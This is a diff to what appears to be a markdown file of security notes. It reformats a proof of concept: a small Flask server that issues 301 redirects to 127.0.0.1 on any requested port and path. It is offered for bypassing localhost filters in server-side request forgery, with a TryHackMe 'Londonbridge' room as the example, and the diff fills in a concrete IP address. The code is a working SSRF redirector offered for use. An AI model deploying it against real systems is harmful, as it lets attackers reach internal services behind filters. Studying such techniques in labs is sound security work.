@@ -1043,23 +1043,25 @@ The poc below bypasses the fix for `CVE-2022-29078` in `^3.1.7`
 
 - See the code below,change the host keyword to your ip
 
-      #! /usr/bin/env python3
-      from flask import Flask, redirect,request
-      from urllib.parse import quote
-      app = Flask(__name__)    
-      
-      @app.route('/',methods=['GET'])    
-      def root():
-          port = request.args.get("port")
-          file = request.args.get("file")
-          if file != None:
-              url =  f"http://127.0.0.1:{port}/{file}"
-          else:
-              url = f"http://127.0.0.1:{port}/"
-          return redirect(url, code=301)
-          
-      if __name__ == "__main__":
-          app.run(host="<ip>", port=8080)
+```python3
+#! /usr/bin/env python3
+from flask import Flask, redirect,request
+from urllib.parse import quote
+app = Flask(__name__)    
+
+@app.route('/',methods=['GET'])    
+def root():
+    port = request.args.get("port")
+    file = request.args.get("file")
+    if file != None:
+        url =  f"http://127.0.0.1:{port}/{file}"
+    else:
+        url = f"http://127.0.0.1:{port}/"
+    return redirect(url, code=301)
+    
+if __name__ == "__main__":
+    app.run(host="10.9.1.30", port=8080)
+```
 
   - Proof with THM's room `Londonbridge`,I passed in `&` in a url encoded format.This approach helps you bypass filtered strings like `localhost`,`127.0.0.1`,`0.0.0.0`.
 
